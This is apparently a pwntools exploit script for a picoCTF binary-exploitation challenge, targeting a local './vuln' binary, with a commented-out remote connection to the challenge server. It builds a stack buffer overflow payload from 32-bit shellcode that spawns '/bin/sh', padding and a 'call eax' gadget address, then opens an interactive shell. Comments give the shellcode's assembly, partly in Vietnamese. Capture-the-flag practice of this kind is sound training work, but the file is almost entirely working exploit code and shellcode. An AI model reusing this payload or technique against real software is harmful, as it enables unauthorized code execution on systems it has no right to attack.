from pwn import *

# sh = remote('saturn.picoctf.net',  52546)
# print (sh.recv(1000))

r = process("./vuln")
#gdb.attach(r, api = True)

call_eax = 0x0804901d
shellcode = b"\x83\xEC\x10\x31\xC0\x83\xC0\x0B\x31\xC9\x31\xD2\x52\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80"
#shellcode = b'\x83\xec\x50\x31\xd2\x52\x31\xc9\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\xcd\x80'
payload = shellcode + b'A'*(28-len(shellcode)) + p32(call_eax)

r.sendline(payload)
r.interactive()

# sh.send(payload)
# sh.interactive()
# sh.close()

# sub esp,0x10 ;(tại vì sau lệnh gets thì nó thu hồi stack là add esp,0x10 vậy thì sẽ vô tình làm mất đi mấy cái shell code mình đã ghi)
# xor eax,eax
# add eax,0x0b
# xor ecx,ecx
# xor edx,edx
# push edx
# push 0x0068732f
# push 0x6e69622f
# mov ebx,esp
# int 0x80